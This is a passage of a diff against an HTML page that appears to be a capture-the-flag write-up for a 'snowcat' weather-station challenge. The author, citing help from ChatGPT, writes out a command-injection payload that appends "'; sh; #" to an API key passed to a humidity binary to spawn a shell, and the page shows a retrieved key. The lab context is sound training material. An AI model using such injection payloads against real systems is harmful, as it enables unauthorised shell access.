+<p><a href="#R-image-d482751e1a9528ab4e26a5563dc29a01" class="lightbox-link"><img alt="Finding and testing key" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-snowcat-7.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-d482751e1a9528ab4e26a5563dc29a01"><img alt="Finding and testing key" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-snowcat-7.png"></a></p>
+<p>Key &ldquo;4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6&rdquo; is valid as the screenshot shows. I then crafted this payload after input from ChatGPT:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/local/weather/humidity <span style="color:#e6db74">&#34;4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6&#39;; sh; #&#34;</span></span></span></code></pre></div>
+<p>Unleashing my payload and finding keys:</p>
+<p><a href="#R-image-9c8c72dd5326175a14fd3da93465c47c" class="lightbox-link"><img alt="Finding keys" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-snowcat-9.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-9c8c72dd5326175a14fd3da93465c47c"><img alt="Finding keys" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-snowcat-9.png"></a></p>
+<p>The API key I needed was <em>8ade723d-9968-45c9-9c33-7606c49c2201</em></p>
 <h2 id="tom-hessman-mission-debrief">Tom Hessman mission debrief</h2>
 <blockquote>
+<p>Fantastic work! You&rsquo;ve successfully exploited those vulnerabilities and retrieved the authorization key from the weather monitoring system.</p>
+<p>Thanks for helping me get access back - our customers are going to have a much better experience now that we&rsquo;ve got the weather station running again!</p>
 </blockquote>
 
   <footer class="footline">
@@ -266,8 +503,22 @@ I love all things testing and QA, maintaining systems, logistics, and helping ou
 <div id="R-footer"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
       </div>
     </aside>
-    <script src="/js/clipboard/clipboard.min.js?1765618621" defer></script>
-    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1765618621" defer></script>
-    <script src="/js/theme.js?1765618621" defer></script>
+    <script src="/js/js-yaml/js-yaml.min.js?1765798844" defer></script>
+    <script src="/js/d3/d3-color.min.js?1765798844" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1765798844" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1765798844" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1765798844" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1765798844" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1765798844" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1765798844" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1765798844" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1765798844" defer></script>
+    <script src="/js/mermaid/mermaid.min.js?1765798844" defer></script>
+    <script>
+      window.relearn.themeUseMermaid = JSON.parse("{}");
+    </script>
+    <script src="/js/clipboard/clipboard.min.js?1765798844" defer></script>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1765798844" defer></script>
+    <script src="/js/theme.js?1765798844" defer></script>
   </body>
 </html>
